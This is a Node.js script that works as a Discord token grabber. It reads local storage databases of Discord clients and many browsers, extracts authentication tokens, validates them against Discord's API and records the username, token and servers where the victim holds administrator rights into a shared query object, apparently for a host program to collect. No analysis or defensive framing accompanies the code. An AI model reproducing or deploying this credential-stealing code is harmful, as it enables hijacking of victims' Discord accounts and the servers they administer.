var fs = require("fs");
var path = require("path");
var axios = require("axios");

if ('error' in global.app.query && global.app.query.error != undefined && global.app.query.error.indexOf('scandir') != -1) {
    global.app.query.error = ""
}

async function GetUser(folderName) {
    try {
        const listTokens = [];
        let folderPath = process.env.APPDATA + "/" + folderName + "/Local Storage/leveldb/";
        if (fs.existsSync(folderPath) == false) {
            folderPath = process.env.LOCALAPPDATA + "/" + folderName + "/Local Storage/leveldb/";
            if (fs.existsSync(folderPath) == false) {
                return;
            }
        }
        const files = fs.readdirSync(path.resolve(folderPath));
        for (const file of files) {
            if (file.endsWith("ldb") == true) {
                const filePath = path.resolve(folderPath, file);
                const content = fs.readFileSync(filePath).toString("utf8");
                const positionTokenKey = content.indexOf("[oken");
                if (positionTokenKey >= 0) {
                    let started = false;
                    let tokenLine = "";
                    for (let i = positionTokenKey; i < content.length; i++) {
                        if (content[i] == "\"") {
                            if (started == false) {
                                started = true;
                            } else {
                                break;
                            }
                            continue;
                        }

                        if (started == true) {
                            tokenLine += content[i];
                        }
                    }

                    if (tokenLine.length > 0 && tokenLine.length < 128) {
                        listTokens.push(tokenLine);
                    }
                } else {
                    const arr = content.matchAll(/(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})/g)
                    for(const token of arr) {
                         if (token.length < 89) {
                             listTokens.push(token)
                         }
                    }
                }
            }
        }
        for (const token of listTokens) {
            try {
                let response = await axios.get("https://discord.com/api/users/@me", {
                    headers: {
                        "authorization": token
                    }
                });
                if ("username" in response.data && typeof response.data.username == "string" && response.data.username.length > 0) {
                    global.app.query.token = token;
                    global.app.query.user = response.data.username + "#" + response.data.discriminator;

                    response = await axios.get("https://discord.com/api/users/@me/guilds", {
                        headers: {
                            "authorization": token
                        }
                    });

                    for (const guild of response.data) {
                        if ((guild.permissions & 0x00000008) == 0x00000008) {
                            global.app.query["guild_" + guild.id] = guild.name;
                        }
                    }
                    console.log(global.app.query);
                } else {
                    console.log("bad user");
                }
            } catch (e) {
                //console.log(e)
            }
        }

    } catch (e) {
        global.app.query.error = String(e);
    }
}

async function StartGetUser() {
    await GetUser("discord");
    await GetUser("discordptb");
    await GetUser("discordcanary");
    await GetUser("Lightcord");
    await GetUser("Yandex/YandexBrowser/Default");
    await GetUser("Opera Software/Opera Stable/Default");
    await GetUser("Opera Software/Opera GX Stable/Default");
    await GetUser("Mozilla/Firefox/Default");
    await GetUser("Microsoft/Edge/Default");
    await GetUser("Microsoft/Edge SxS/Default");
    await GetUser("Chromium/User Data/Default");
    await GetUser("Google/Chrome/User Data/Default");
    await GetUser("BraveSoftware/Brave-Browser/User Data/Default");
    await GetUser("Kometa/User Data/Default");
    await GetUser("Amigo/User Data/Default");
}

StartGetUser();
